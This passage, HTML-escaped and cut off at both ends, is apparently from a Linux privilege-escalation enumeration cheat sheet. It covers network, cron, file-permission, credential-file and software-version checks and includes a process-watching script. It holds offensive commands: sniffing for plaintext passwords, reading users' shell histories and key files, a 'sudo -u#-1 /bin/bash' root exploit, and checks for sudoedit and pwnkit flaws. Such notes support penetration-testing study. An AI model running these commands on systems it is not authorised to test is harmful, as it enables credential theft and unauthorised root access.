Mac\u003c/span\u003e\nlsof -Pni  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e established connections\u003c/span\u003e\nfuser -n tcp PORTNUM \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e who is using port?\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e advanced, as root: data under /proc/net/\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e known hosts\u003c/span\u003e\ncat /etc/hosts\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e iptables rules\u003c/span\u003e\ncat /etc/iptables/rules.v4 \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Debian,Ubuntu\u003c/span\u003e\ncat /etc/sysconfig/iptables \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e RHEL,CentOS,Fedora\u003c/span\u003e\ncat /etc/iptables/rules.v6 \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Debian,Ubuntu\u003c/span\u003e\ncat /etc/sysconfig/ip6tables \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e RHEL,CentOS,Fedora\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e must be root to run 'iptables'\u003c/span\u003e\niptables -L -v -n\niptables -t nat -L -v -n  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e NAT info\u003c/span\u003e\niptables-save  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e saved iptables\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e DNS resolver info\u003c/span\u003e\ncat /etc/resolv.conf\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if you have sudo permissions for tcpdump,\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e privesc with it (it's a GTFOBin).\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Also, sniff for plaintext creds:\u003c/span\u003e\nsudo tcpdump -i lo -A \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep -i \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003epass\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##############################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# PROCESSES  #################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##############################\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e running processes\u003c/span\u003e\nps -ef wwf\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look for unusual processes\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or processes running as root that shouldn't be\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e view all cron scripts\u003c/span\u003e\nls -lah /etc/cron\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look at system-wide crontab\u003c/span\u003e\ncat /etc/crontab\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e pay attention to PATH in /etc/crontab and any bad file perms of scripts\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check this user's cron jobs\u003c/span\u003e\ncrontab -l\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check for running cron jobs\u003c/span\u003e\ngrep \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eCRON\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e /var/log/syslog\ngrep \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eCRON\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e /var/log/cron.log\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list every user's cron jobs\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003euser\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003ecut -f1 -d: /etc/passwd\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edo\u003c/span\u003e crontab -u \u003cspan class=\"pl-smi\"\u003e$user\u003c/span\u003e -l\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edone\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##############################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# FILESYSTEM  ################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##############################\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e mounted filesystems\u003c/span\u003e\nmount\ncat /etc/fstab\ncat /etc/auto\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003emaster\ndf -h \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e disk stats\u003c/span\u003e\nlsblk \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e available disks\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e unmounted partitions may have juicy files on them\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look for credentials in /etc/fstab or /etc/auto*\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e find all SUID and SGID binaries\u003c/span\u003e\nfind / -type f \u003cspan class=\"pl-cce\"\u003e\\(\u003c/span\u003e -perm -u+s -o -perm -g+s \u003cspan class=\"pl-cce\"\u003e\\)\u003c/span\u003e -executable -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e /dev/null\nfind / -type f \u003cspan class=\"pl-cce\"\u003e\\(\u003c/span\u003e -perm -u+s -o -perm -g+s \u003cspan class=\"pl-cce\"\u003e\\)\u003c/span\u003e -perm -o+x -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e /dev/null\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list writable directories in PATH\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e bash, sh:\u003c/span\u003e\n( \u003cspan class=\"pl-c1\"\u003eset\u003c/span\u003e -o noglob\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e IFS=:\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e\u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003ep\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$PATH\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edo\u003c/span\u003e [ \u003cspan class=\"pl-k\"\u003e-w\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$p\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e ] \u003cspan class=\"pl-k\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e ls -ald \u003cspan class=\"pl-smi\"\u003e$p\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edone\u003c/span\u003e )\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e zsh:\u003c/span\u003e\n( \u003cspan class=\"pl-c1\"\u003eset\u003c/span\u003e -o noglob\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e IFS=:\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003efor\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003ep\u003c/span\u003e \u003cspan class=\"pl-k\"\u003ein\u003c/span\u003e (\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003eecho \u003cspan class=\"pl-smi\"\u003e$PATH\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e)\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edo\u003c/span\u003e [ \u003cspan class=\"pl-k\"\u003e-w\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$p\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e ] \u003cspan class=\"pl-k\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e ls -ald \u003cspan class=\"pl-smi\"\u003e$p\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edone\u003c/span\u003e )\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e find world-writable files and directories\u003c/span\u003e\nfind / \u003cspan class=\"pl-cce\"\u003e\\(\u003c/span\u003e -path /sys -o -path /proc -o -path /dev \u003cspan class=\"pl-cce\"\u003e\\)\u003c/span\u003e -prune -o -perm -o+w -type d -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\nfind / \u003cspan class=\"pl-cce\"\u003e\\(\u003c/span\u003e -path /sys -o -path /proc -o -path /dev \u003cspan class=\"pl-cce\"\u003e\\)\u003c/span\u003e -prune -o -perm -o+w -type f -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to limit search to current file system mount, use -mount or -xdev\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e find directories/files _this user_ can write to, not owned by me\u003c/span\u003e\nfind / \u003cspan class=\"pl-cce\"\u003e\\(\u003c/span\u003e -path /sys -o -path /proc \u003cspan class=\"pl-cce\"\u003e\\)\u003c/span\u003e -prune -o -writable -type d -not -user \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003ewhoami\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\nfind / \u003cspan class=\"pl-cce\"\u003e\\(\u003c/span\u003e -path /sys -o -path /proc \u003cspan class=\"pl-cce\"\u003e\\)\u003c/span\u003e -prune -o -perm -o+w -type d -not -user \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003ewhoami\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\nfind / \u003cspan class=\"pl-cce\"\u003e\\(\u003c/span\u003e -path /sys -o -path /proc \u003cspan class=\"pl-cce\"\u003e\\)\u003c/span\u003e -prune -o -writable -type f -not -user \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003ewhoami\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -ls \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check Capabilities of files\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e look for GTFOBins that have cap_setuid+ep (effective, permitted)\u003c/span\u003e\n/usr/sbin/getcap -r / \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep cap_setuid\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e shell history\u003c/span\u003e\ncat /home/\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e/.\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003ehistory\ngrep -E \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003etelnet|ssh|mysql\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e /home/\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e/.\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003ehistory \u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e/dev/null\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e credential files\u003c/span\u003e\nls -l /home/\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e/.ssh/id_\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e ssh keys\u003c/span\u003e\nls -AlR /home/\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e/.gnupg  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e PGP keys\u003c/span\u003e\nls -l /tmp/krb5\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Kerberos tickets\u003c/span\u003e\nfind / -type f -name \u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e.gpg\nfind / -type f -name id_\u003cspan class=\"pl-k\"\u003e*\u003c/span\u003e\n\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##############################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# SOFTWARE  ##################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e##############################\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Info on installed packages\u003c/span\u003e\ndpkg -l  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Debian\u003c/span\u003e\nrpm -qa --last  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e RedHat\u003c/span\u003e\nyum list \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep installed  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e CentOS/RedHat w/ Yum\u003c/span\u003e\napt list --installed  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Debain w/ Apt\u003c/span\u003e\npkg_info  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e xBSD\u003c/span\u003e\npkginfo  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Solaris\u003c/span\u003e\nls -d /var/db/pkg/  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Gentoo\u003c/span\u003e\npacman -Q  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Arch\u003c/span\u003e\ncat /etc/apt/sources.list  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Apt sources\u003c/span\u003e\nls -l /etc/yum.repos.d/  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Yum repos\u003c/span\u003e\ncat /etc/yum.conf  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Yum config\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Kernel modules\u003c/span\u003e\nlsmod \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list loaded modules\u003c/span\u003e\n/sbin/modinfo MODULENAME \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get info on module\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check version info of useful binaries\u003c/span\u003e\ngcc -v  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e compiler\u003c/span\u003e\nldd --version  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e glibc version\u003c/span\u003e\npython --version\npython3 --version\nperl -v\nphp -v\nruby -v\nnode -v\nmysql --version\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e See if other useful GTFO-bins are present\u003c/span\u003e\nwhich awk base64 curl dd gdb gzip less lua nano nmap nohup openssl rsync scp ssh screen sed socat tar tmux vi vim wget xxd xz zip\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e#################################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# VULNERABILITIES  ##############\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e#################################\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check for CVE-2021-3156 (sudoedit heap-based buffer overflow, privesc)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e *check only works if you are in sudoers file. Affects all legacy versions\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Exploit works even if user isn't in sudoers file.\u003c/span\u003e\nsudoedit -s /\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Vulnerable if it says 'sudoedit: /: not a regular file' instead of 'usage:...'\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e use exploit: https://github.com/CptGibbon/CVE-2021-3156.git\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check sudo version\u003c/span\u003e\nsudo -V\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if older than 1.8.28, root privesc:\u003c/span\u003e\nsudo -u#-1 /bin/bash\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or sudo -u \\#$((0xffffffff)) /bin/bash\u003c/span\u003e\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check for pwnkit (look for version \u0026lt; 0.120)\u003c/span\u003e\n/usr/bin/pkexec --version\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e###################################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e# MISCELLANEOUS  ##################\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e###################################\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e kernel system messages since boot\u003c/span\u003e\ndmesg\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e processor and memory info\u003c/span\u003e\ncat /proc/cpuinfo\ncat /proc/meminfo\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Message of the Day\u003c/span\u003e\ncat /etc/motd\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Get SELinux status\u003c/span\u003e\ngetenforce\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.1.1 Watching for Linux Process Changes\u003c/h3\u003e\u003ca id=\"user-content-611-watching-for-linux-process-changes\" class=\"anchor\" aria-label=\"Permalink: 6.1.1 Watching for Linux Process Changes\" href=\"#611-watching-for-linux-process-changes\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"#!/bin/bash\n# source: Ippsec nineveh walkthrough\n\n# Loop by line\nIFS=$'\\n'\n\nold_process=$(ps aux --forest | grep -v \u0026quot;ps aux --forest\u0026quot; | grep -v \u0026quot;sleep 1\u0026quot; | grep -v $0)\n\nwhile true; do\n  new_process=$(ps aux --forest | grep -v \u0026quot;ps aux --forest\u0026quot; | grep -v \u0026quot;sleep 1\u0026quot; | grep -v $0)\n  diff \u0026lt;(echo \u0026quot;$old_process\u0026quot;) \u0026lt;(echo \u0026quot;$new_process\u0026quot;) | grep [\\\u0026lt;\\\u0026gt;]\n  sleep 1\n  old_process=$new_process\ndone\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#!\u003c/span\u003e/bin/bash\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e source: Ippsec nineveh walkthrough\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Loop by line\u003c/span\u003e\nIFS=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$'\u003c/span\u003e\u003cspan class=\"pl-cce\"\u003e\\n\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\nold_process=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003eps aux --forest \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eps aux --forest\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003esleep 1\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"pl-smi\"\u003e$0\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etrue\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003edo\u003c/span\u003e\n  new_process=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$(\u003c/span\u003eps aux --forest \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eps aux --forest\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003esleep 1\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep -v \u003cspan class=\"pl-smi\"\u003e$0\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e\n  diff \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\u0026lt;(\u003c/span\u003eecho \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$old_process\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\u0026lt;(\u003c/span\u003eecho \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003e$new_process\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e)\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep [\u003cspan class=\"pl-cce\"\u003e\\\u0026lt;\\\u0026gt;\u003c/span\u003e]\n  sleep 1\n  old_process=\u003cspan class=\"pl-smi\"\u003e$new_process\u003c/span\u003e\n\u003cspan 